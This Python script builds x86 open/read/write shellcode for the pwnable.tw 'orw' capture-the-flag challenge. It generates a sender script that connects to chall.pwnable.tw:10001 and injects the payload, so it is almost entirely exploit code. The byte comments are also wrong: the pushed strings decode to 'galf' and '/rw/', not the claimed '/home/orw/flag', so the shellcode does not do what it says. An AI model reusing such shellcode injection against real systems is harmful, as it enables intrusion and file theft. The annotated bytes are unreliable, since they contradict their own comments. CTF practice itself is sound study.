#!/usr/bin/env python3

# Final attempt with a different shellcode approach

def create_final_shellcode():
    # Try a different approach - maybe the issue is with the string construction
    shellcode = b""
    
    # Use a simpler approach with push instructions
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x50"                  # push eax (null terminator)
    shellcode += b"\x68\x67\x61\x6c\x66"  # push "flag"
    shellcode += b"\x68\x2f\x72\x77\x2f"  # push "/orw/"
    shellcode += b"\x68\x2f\x68\x6f\x6d"  # push "/hom"
    
    # Now esp points to "/home/orw/flag\0"
    
    # open syscall
    shellcode += b"\x89\xe3"              # mov ebx, esp (filename)
    shellcode += b"\x31\xc9"              # xor ecx, ecx (O_RDONLY)
    shellcode += b"\x31\xd2"              # xor edx, edx (mode)
    shellcode += b"\xb0\x05"              # mov al, 5 (sys_open)
    shellcode += b"\xcd\x80"              # int 0x80
    
    # read syscall
    shellcode += b"\x89\xc3"              # mov ebx, eax (file descriptor)
    shellcode += b"\x89\xe1"              # mov ecx, esp (buffer)
    shellcode += b"\x31\xd2"              # xor edx, edx
    shellcode += b"\xb2\x64"              # mov dl, 100 (read 100 bytes)
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x03"              # mov al, 3 (sys_read)
    shellcode += b"\xcd\x80"              # int 0x80
    
    # write syscall
    shellcode += b"\x89\xc2"              # mov edx, eax (bytes read)
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x04"              # mov al, 4 (sys_write)
    shellcode += b"\xb3\x01"              # mov bl, 1 (stdout)
    shellcode += b"\xcd\x80"              # int 0x80
    
    # exit
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x40"                  # inc eax (sys_exit = 1)
    shellcode += b"\xcd\x80"              # int 0x80
    
    return shellcode

def main():
    shellcode = create_final_shellcode()
    print(f"Final shellcode: {len(shellcode)} bytes")
    print(f"Hex: {shellcode.hex()}")
    
    # Write to file
    with open('/workspace/orw_challenge/final.bin', 'wb') as f:
        f.write(shellcode)
    
    print("Shellcode written to final.bin")
    
    # Create a script to send it with better error handling
    with open('/workspace/orw_challenge/send_final.py', 'w') as f:
        f.write(f'''#!/usr/bin/env python3
import socket
import time
import sys

shellcode = bytes.fromhex("{shellcode.hex()}")

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(30)
    
    print("Connecting...")
    s.connect(("chall.pwnable.tw", 10001))
    
    print("Receiving prompt...")
    data = s.recv(1024)
    print(f"Prompt: {{data.decode()}}")
    
    print("Sending shellcode...")
    s.send(shellcode)
    
    print("Waiting for response...")
    time.sleep(2)
    
    # Try to get response
    response = s.recv(1024)
    if response:
        print(f"Response: {{response}}")
    else:
        print("No immediate response")
    
    # Try to get more data
    s.settimeout(5)
    try:
        while True:
            data = s.recv(1024)
            if not data:
                break
            print(f"Data: {{data}}")
    except socket.timeout:
        print("No more data")
    
except Exception as e:
    print(f"Error: {{e}}")
finally:
    s.close()
''')
    
    print("Final script created: send_final.py")

if __name__ == "__main__":
    main()